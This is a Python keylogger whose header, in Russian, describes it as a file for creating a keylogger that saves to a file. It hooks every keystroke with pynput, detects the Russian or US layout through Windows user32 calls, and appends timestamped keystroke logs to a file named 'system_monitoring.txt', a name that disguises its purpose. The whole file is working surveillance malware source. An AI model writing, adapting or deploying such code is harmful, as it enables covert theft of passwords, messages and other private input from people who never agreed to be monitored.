"""ФАЙЛ КОСТИН, ПО СОЗДАНИЮ КЕЙЛОГЕРА и сохранения в файл"""
import datetime
from pynput import keyboard
import ctypes

# СЛОВАРИ
# издевательство, перевод с англ раскладки на РУ
dict_key_RU = {
    81: 'й', 87: 'ц', 69: 'у', 82: 'к', 84: 'е', 89: 'н', 85: 'г', 73: 'ш', 79: 'щ', 80: 'з',
    65: 'ф', 83: 'ы', 68: 'в', 70: 'а', 71: 'п', 72: 'р', 74: 'о', 75: 'л', 76: 'д', 186: 'ж',
    90: 'я', 88: 'ч', 67: 'с', 86: 'м', 66: 'и', 78: 'т', 77: 'ь', 188: 'б', 190: 'ю', 191: '.',
    219: 'х', 221: 'ъ', 192: 'ё', 220: '\\', 222: 'э', 187: '=', 189: '-', 49: '1', 50: '2', 51: '3', 52: '4', 53: '5',
    54: '6', 55: '7', 56: '8', 57: '9', 48: '0'
}

# издевательство, перевод с ру раскладки на АНГЛ
dict_key_EN = {
    82: 'q', 88: 'w', 70: 'e', 83: 'r', 85: 't', 90: 'y', 86: 'u', 74: 'i', 80: 'o', 81: 'p',
    66: 'a', 84: 's', 69: 'd', 71: 'f', 72: 'g', 73: 'h', 75: 'j', 76: 'k', 77: 'l', 187: ';',
    91: 'z', 89: 'x', 68: 'c', 87: 'v', 67: 'b', 79: 'n', 78: 'm', 189: ',', 191: '.', 192: '/',
    220: '[', 222: ']', 193: '`', 221: '\\', 223: "'", 188: '=', 190: '-', 50: '1', 51: '2', 52: '3', 53: '4', 54: '5',
    55: '6', 56: '7', 57: '8', 58: '9', 49: '0'
}

# словарь кодов ЯЗЫКОВ
dict_langs = {
    1033: "US",
    1049: "RU"
}


# СПИСКИ
# список с логами
log_keys = []
# список с логами системных клавиш
log_keys_sys = []


class AddTextFile:
    """СОЗДАНИЕ .TXT ФАЙЛА С ЛОГАМИ"""
    def add_el_file(self, log_key, log_key_sys, file_name='system_monitoring.txt'):
        self.log_key = log_key
        self.file_name = file_name
        self.log_key_sys = log_key_sys

        if len(self.log_key) == 2:
            with open(self.file_name, 'a', encoding='utf-8') as file:
                current_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                file.write('\n\n')  # запись новых списков с новой строки
                file.write(f'[ВРЕМЯ {current_time}]   ')
                for item in self.log_key:
                    file.write(item + '\n')  # прочитка каждой строки из 100 символов в списке и печатание ее с новой строки

                file.write(f'|\n'
                           f'|\n'
                           f'[ФИКСАЦИЯ СИСТЕМНЫХ КЛАВИШ]   ')
                for jtem in self.log_key_sys:
                    file.write(jtem + '\n')  # прочитка каждой строки из 100 символов в списке системных клавиш и печатание ее с новой строки

            log_keys.clear()
            log_keys_sys.clear()


class LanguageQual(AddTextFile):
    """КЛАСС ПОЛУЧЕНИЯ ЯЗЫКА РАССКЛАДКИ"""
    @staticmethod
    def keyboardLayout():
        """Функция получения нитей расклодок"""
        # хндл главного окна
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        # нить исполняемого данного окна ID
        nitya_id = ctypes.windll.user32.GetWindowThreadProcessId(hwnd, None)
        # хндл нити. Этот хендл представляет код раскладки клавиатуры для данной нити.
        hndl_nit = ctypes.windll.user32.GetKeyboardLayout(nitya_id)

        lang_id = hndl_nit & 0xFFFF
        # print(lang_id)
        return lang_id


class KeyboardPrint(LanguageQual):
    """КЕЙЛОГЕР, КЛАСС СОЗДАНИЯ"""
    def __init__(self, long_text='', long_key_sys=''):
        self.long_text = long_text
        self.long_key_sys = long_key_sys

    def on_press(self, key):
        """Фиксация нажатия клавиш и преобразование их в текст"""
        lang_id = self.keyboardLayout()  # получение id
        current_lang = dict_langs.get(lang_id, 'ERROR')  # находим по ключу ID языка в словаре
        # print(f'\nLANG - {current_lang}')
        self.add_el_file(log_keys, log_keys_sys)

        if len(self.long_text) >= 100:
            log_keys.append(self.long_text)
            log_keys_sys.append(self.long_key_sys)
            self.long_text = ''
            self.long_key_sys = ''
            print(log_keys, 'СПИСОК')
            print(log_keys_sys, 'СПИСОК СИСТМЕНЫХ КЛАВИШ\n\n')

        try:
            if current_lang == 'US':
                key_EN = dict_key_EN.get(key.vk + 1, ' NoKey ')  # смотрим, есть ли в АНГЛ словаре, ключ+1. Если да, ОК
                self.long_text += key_EN
                print(f'Press - {key_EN}')
                print(self.long_text)
            elif current_lang == 'RU':
                key_RU = dict_key_RU.get(key.vk, ' NoKey ')  # анологично смотрим по ключам в РУ словаре, просто ключ
                self.long_text += key_RU
                print(f'Нажата - {key_RU}')  # , Ord Code = {key.vk}. KeyEN = {key}
                print(self.long_text)
        except AttributeError:
            if key == keyboard.Key.space:
                self.key_space()
            elif key == keyboard.Key.backspace and len(self.long_text) != 0:
                self.key_del()
            elif key == keyboard.Key.enter:
                self.key_enter()
            elif key == keyboard.Key.shift:
                self.key_shift()

            if key != keyboard.Key.space and key != keyboard.Key.backspace and key != keyboard.Key.enter and key != keyboard.Key.shift:
                self.long_key_sys += f'*{str(key).upper()}*   '
            print(f'Press2 - {key}')  # если возникает ошибка, печатаем просто, обычно это просто шифты, пробелы и тд

    # пробел
    def key_space(self):
        self.long_text += ' '
        print(self.long_text)

    # удалить
    def key_del(self):
        self.long_text = self.long_text[:-1]
        print(self.long_text)

    # энтер
    def key_enter(self):
        self.long_text += ' '
        print(self.long_text)

    def key_shift(self):
        self.long_text += '*SHIFT->'
        print(self.long_text)

    def key_print(self):
        """Обработчик клавиатуры, отслеживаем клавиатуру"""
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()


key = KeyboardPrint()
# Вызов метода key_print для начала захвата ввода с клавиатуры
key.key_print()






